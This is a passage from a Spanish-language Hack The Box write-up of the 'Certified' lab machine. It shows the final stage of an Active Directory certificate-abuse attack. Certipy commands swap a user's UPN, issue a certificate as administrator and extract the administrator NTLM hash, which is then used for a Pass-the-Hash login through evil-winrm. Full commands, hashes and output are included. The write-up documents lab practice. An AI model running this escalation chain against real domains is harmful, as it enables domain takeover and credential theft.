Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 5
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

Limpiamos el UPN:

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/certified/content]
└─$ certipy account \
    -u 'management_svc@certified.htb' -hashes :a091c1832bcdd4677c28b5a6a1295584 \
    -dc-ip '10.129.63.108' -upn ca_operator@certified.htb  \
    -user 'ca_operator' update
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_operator':
    userPrincipalName                   : ca_operator@certified.htb
[*] Successfully updated 'ca_operator'
```

Y solicitamos un certificado para obtener el hash NTLM del usuario administrator.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/certified/content]
└─$ certipy auth \
    -dc-ip '10.129.63.108' -pfx 'administrator.pfx' \
    -username 'administrator' -domain 'certified.htb'
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator'
[*] Using principal: 'administrator@certified.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@certified.htb': aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34
```

- Obtenemos un `ccache` para autenticarnos contra kerberos
- Obtenemos el hash NTLM del usuario administrator


Ahora puedo hacer Pass The Hash y autenticarme via winrm:

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/certified]
└─$ evil-winrm -i 10.129.63.108 -u administrator -H '0d5b49608bbce1751f708748f67e2d34'

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
certified\administrator
```

***PWNED***

Flags:

```bash
*Evil-WinRM* PS C:\Users\management_svc\Desktop> type user.txt
c7f5ecbaaac8ebc44b23****
*Evil-WinRM* PS C:\Users\management_svc\Desktop> type C:\Users\Administrator\Desktop\root.txt
4662cf359494a0663ada*****
```

![](assets/Pasted%20image%2020260115124050.png)
